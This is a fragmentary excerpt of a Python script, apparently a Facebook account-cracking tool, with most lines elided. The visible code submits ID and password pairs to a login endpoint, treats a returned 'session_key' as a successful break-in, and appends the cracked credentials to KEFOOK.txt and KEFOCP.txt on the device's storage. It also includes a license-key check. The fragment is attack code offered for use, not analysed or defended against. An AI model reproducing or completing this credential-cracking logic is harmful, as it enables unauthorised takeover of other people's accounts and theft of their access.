...
'Content-Length': '2126'}
                ...
                if 'session_key' in q:
                    ...
                    print(f'\r {H}[KEFO-OK] {sid} | {ps}')
                    oks.append(sid)
                    open('/sdcard/KEFOOK.txt','a').write(f"{sid} | {ps}\n")
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    print(f'\r\033[1;31m [] {sid} | {ps}')
                    cps.append(sid)
                    open('/sdcard/KEFOCP.txt','a').write(f"{sid} | {ps}\n")
...
def chigozie():
        ...
        try:
            ...
            if API_KEY in check_key:
                ...
                print("\033[1;97m[+] YOUR KEY : \033[0;92m%s"%(API_KEY))
